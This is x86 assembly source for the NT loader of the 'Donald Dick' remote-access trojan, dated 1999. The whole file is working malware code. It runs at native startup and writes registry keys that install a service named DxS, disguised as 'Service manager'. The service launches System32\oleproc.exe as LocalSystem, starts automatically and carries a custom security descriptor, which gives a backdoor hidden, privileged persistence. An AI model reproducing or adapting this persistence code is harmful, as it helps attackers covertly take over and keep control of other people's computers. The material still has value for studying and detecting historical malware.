;  donald dick loader for win NT
;  written by alexander yaworsky
;  '99

.386p

extrn NtClose:NEAR
extrn NtCreateKey:NEAR
extrn NtSetValueKey:NEAR
extrn NtTerminateProcess:NEAR
extrn RtlInitUnicodeString:NEAR

include bootexec.inc


_DATA        SEGMENT USE32 DWORD PUBLIC 'DATA'

Attr         OBJECT_ATTRIBUTES  <>
UStr         UNICODE_STRING  <>     ; common unicode string
KeyH         DD    0  ; used internally by CreateKey

KeyName      DB    '\',0,'R',0,'e',0,'g',0,'i',0,'s',0,'t',0,'r',0,'y',0
             DB    '\',0,'M',0,'a',0,'c',0,'h',0,'i',0,'n',0,'e',0
             DB    '\',0,'S',0,'Y',0,'S',0,'T',0,'E',0,'M',0
             DB    '\',0,'C',0,'u',0,'r',0,'r',0,'e',0,'n',0,'t',0
             DB        'C',0,'o',0,'n',0,'t',0,'r',0,'o',0,'l',0
             DB            'S',0,'e',0,'t',0
             DB    '\',0,'S',0,'e',0,'r',0,'v',0,'i',0,'c',0,'e',0,'s',0
             DB    '\',0,'D',0,'x',0,'S', 0, 0, 0
KeyNameSec   DB    '\',0,'R',0,'e',0,'g',0,'i',0,'s',0,'t',0,'r',0,'y',0
             DB    '\',0,'M',0,'a',0,'c',0,'h',0,'i',0,'n',0,'e',0
             DB    '\',0,'S',0,'Y',0,'S',0,'T',0,'E',0,'M',0
             DB    '\',0,'C',0,'u',0,'r',0,'r',0,'e',0,'n',0,'t',0
             DB        'C',0,'o',0,'n',0,'t',0,'r',0,'o',0,'l',0
             DB            'S',0,'e',0,'t',0
             DB    '\',0,'S',0,'e',0,'r',0,'v',0,'i',0,'c',0,'e',0,'s',0
             DB    '\',0,'D',0,'x',0,'S',0
             DB    '\',0,'S',0,'e',0,'c',0,'u',0,'r',0,'i',0,'t',0,'y',0, 0, 0

nDisplayName      DB    'D',0,'i',0,'s',0,'p',0,'l',0,'a',0,'y',0
                  DB    'N',0,'a',0,'m',0,'e',0,0,0
DisplayName       DB    'S',0,'e',0,'r',0,'v',0,'i',0,'c',0,'e',0,' ',0
                  DB    'm',0,'a',0,'n',0,'a',0,'g',0,'e',0,'r',0,0,0
DisplayNameEnd    LABEL BYTE

nErrorControl     DB    'E',0,'r',0,'r',0,'o',0,'r',0
                  DB    'C',0,'o',0,'n',0,'t',0,'r',0,'o',0,'l',0,0,0
ErrorControl      DD    0
ErrorControlEnd   LABEL DWORD

nImagePath        DB    'I',0,'m',0,'a',0,'g',0,'e',0
                  DB    'P',0,'a',0,'t',0,'h',0,0,0
ImagePath         DB    '%',0,'S',0,'y',0,'s',0,'t',0,'e',0,'m',0,'R',0,'o',0
                  DB    'o',0,'t',0,'%',0,'\',0,'S',0,'y',0,'s',0,'t',0,'e',0
                  DB    'm',0,'3',0,'2',0,'\',0,'o',0,'l',0,'e',0,'p',0,'r',0
                  DB    'o',0,'c',0,'.',0,'e',0,'x',0,'e',0,0,0,0,0
ImagePathEnd      LABEL BYTE

nObjectName       DB    'O',0,'b',0,'j',0,'e',0,'c',0,'t',0
                  DB    'N',0,'a',0,'m',0,'e',0,0,0
ObjectName        DB    'L',0,'o',0,'c',0,'a',0,'l',0
                  DB    'S',0,'y',0,'s',0,'t',0,'e',0,'m',0,0,0
ObjectNameEnd     LABEL BYTE

nStart            DB    'S',0,'t',0,'a',0,'r',0,'t',0,0,0
vStart            DD    2
vStartEnd         LABEL DWORD

nType             DB    'T',0,'y',0,'p',0,'e',0,0,0
vType             DD    110h
vTypeEnd          LABEL DWORD

nSecurity         DB    'S',0,'e',0,'c',0,'u',0,'r',0,'i',0,'t',0,'y',0,0,0
Security          DB    01h,00h,14h,80h,0c0h,00h,00h,00h,0cch,00h,00h,00h,14h
                  DB    00h,00h,00h,34h,00h,00h,00h,02h,00h,20h,00h,01h,00h
                  DB    00h,00h,02h,80h,18h,00h,0ffh,01h,0fh,00h,01h,01h,00h
                  DB    00h,00h,00h,00h,01h,00h,00h,00h,00h,20h,02h,00h,00h
                  DB    02h,00h,8ch,00h,05h,00h,00h,00h,00h,00h,18h,00h,8dh
                  DB    01h,02h,00h,01h,01h,00h,00h,00h,00h,00h,01h,00h,00h
                  DB    00h,00h,00h,00h,00h,00h,00h,00h,1ch,00h,0fdh,01h,02h
                  DB    00h,01h,02h,00h,00h,00h,00h,00h,05h,20h,00h,00h,00h
                  DB    23h,02h,00h,00h,00h,00h,00h,00h,00h,00h,1ch,00h,0ffh
                  DB    01h,0fh,00h,01h,02h,00h,00h,00h,00h,00h,05h,20h,00h
                  DB    00h,00h,20h,02h,00h,00h,00h,00h,00h,00h,00h,00h,1ch
                  DB    00h,0ffh,01h,0fh,00h,01h,02h,00h,00h,00h,00h,00h,05h
                  DB    20h,00h,00h,00h,25h,02h,00h,00h,00h,00h,00h,00h,00h
                  DB    00h,18h,00h,0fdh,01h,02h,00h,01h,01h,00h,00h,00h,00h
                  DB    00h,05h,12h,00h,00h,00h,25h,02h,00h,00h,01h,01h,00h
                  DB    00h,00h,00h,00h,05h,12h,00h,00h,00h,01h,01h,00h,00h
                  DB    00h,00h,00h,05h,12h,00h,00h,00h
SecurityEnd       LABEL BYTE

_DATA        ENDS


_TEXT        SEGMENT USE32 DWORD PUBLIC 'CODE'
             ASSUME  CS:_TEXT, DS:_DATA, ES:_DATA

_NtProcessStartup:
             PUBLIC _NtProcessStartup

             mov   EAX,OFFSET KeyName
             call  CreateKey
             or    EAX,EAX
             jz    Terminate

             push  OFFSET nDisplayName
             push  OFFSET UStr
             call  RtlInitUnicodeString

             push  DisplayNameEnd-DisplayName   ; data size
             push  OFFSET DisplayName           ; data
             push  REG_SZ                       ; type
             push  0                            ; title index
             push  OFFSET UStr                  ; value name
             push  KeyH                         ; key handle
             call  NtSetValueKey
             or    EAX,EAX
             jnz   SetValueFailed

             push  OFFSET nErrorControl
             push  OFFSET UStr
             call  RtlInitUnicodeString

             push  ErrorControlEnd-ErrorControl ; data size
             push  OFFSET ErrorControl          ; data
             push  REG_DWORD                    ; type
             push  0                            ; title index
             push  OFFSET UStr                  ; value name
             push  KeyH                         ; key handle
             call  NtSetValueKey
             or    EAX,EAX
             jnz   SetValueFailed

             push  OFFSET nImagePath
             push  OFFSET UStr
             call  RtlInitUnicodeString

             push  ImagePathEnd-ImagePath       ; data size
             push  OFFSET ImagePath             ; data
             push  REG_EXPAND_SZ                ; type
             push  0                            ; title index
             push  OFFSET UStr                  ; value name
             push  KeyH                         ; key handle
             call  NtSetValueKey
             or    EAX,EAX
             jnz   SetValueFailed

             push  OFFSET nObjectName
             push  OFFSET UStr
             call  RtlInitUnicodeString

             push  ObjectNameEnd-ObjectName     ; data size
             push  OFFSET ObjectName            ; data
             push  REG_SZ                       ; type
             push  0                            ; title index
             push  OFFSET UStr                  ; value name
             push  KeyH                         ; key handle
             call  NtSetValueKey
             or    EAX,EAX
             jnz   SHORT SetValueFailed

             push  OFFSET nStart
             push  OFFSET UStr
             call  RtlInitUnicodeString

             push  vStartEnd-vStart             ; data size
             push  OFFSET vStart                ; data
             push  REG_DWORD                    ; type
             push  0                            ; title index
             push  OFFSET UStr                  ; value name
             push  KeyH                         ; key handle
             call  NtSetValueKey
             or    EAX,EAX
             jnz   SHORT SetValueFailed

             push  OFFSET nType
             push  OFFSET UStr
             call  RtlInitUnicodeString

             push  vTypeEnd-vType               ; data size
             push  OFFSET vType                 ; data
             push  REG_DWORD                    ; type
             push  0                            ; title index
             push  OFFSET UStr                  ; value name
             push  KeyH                         ; key handle
             call  NtSetValueKey
             or    EAX,EAX
             jz    SHORT CloseKeyHandle

SetValueFailed:
             push  KeyH
             call  NtClose
             jmp   SHORT Terminate

CloseKeyHandle:
             push  KeyH
             call  NtClose

             mov   EAX,OFFSET KeyNameSec
             call  CreateKey
             or    EAX,EAX
             jz    SHORT Terminate

             push  OFFSET nSecurity
             push  OFFSET UStr
             call  RtlInitUnicodeString

             push  SecurityEnd-Security         ; data size
             push  OFFSET Security              ; data
             push  REG_BINARY                   ; type
             push  0                            ; title index
             push  OFFSET UStr                  ; value name
             push  KeyH                         ; key handle
             call  NtSetValueKey
             or    EAX,EAX
             jnz   SHORT SetValueFailed

             push  KeyH
             call  NtClose

Terminate:
             push  0                   ; exit code
             push  -1                  ; process id
             call  NtTerminateProcess
             mov   EBX,1
             mov   DWORD PTR [EBX],0
             ret   4

;
; SUBROUTINE:  Create key in the registry
; PARAMS:  EAX - key name offset
; RESULT:  EAX (and KeyH variable) - key handle or 0
;
CreateKey:
             push  EAX
             push  OFFSET UStr
             call  RtlInitUnicodeString

             mov   Attr.oaLength,SIZE OBJECT_ATTRIBUTES
             mov   Attr.oaRootDirectory,0
             mov   Attr.oaObjectName,OFFSET UStr
             mov   Attr.oaAttributes,OBJ_CASE_INSENSITIVE
             mov   Attr.oaSecurityDescriptor,0
             mov   Attr.oaSecurityQoS,0

             push  0                   ; disposion
             push  REG_OPTION_VOLATILE  ; create options
             push  0                   ; class
             push  0                   ; title index
             push  OFFSET Attr         ; object attributes
             push  KEY_ALL_ACCESS      ; desired access
             push  OFFSET KeyH         ; key handle
             call  NtCreateKey
             or    EAX,EAX
             jz    SHORT ckok
             xor   EAX,EAX
             jmp   SHORT ckexit
ckok:
             mov   EAX,KeyH
ckexit:
             ret

_TEXT        ENDS

             END   _NtProcessStartup
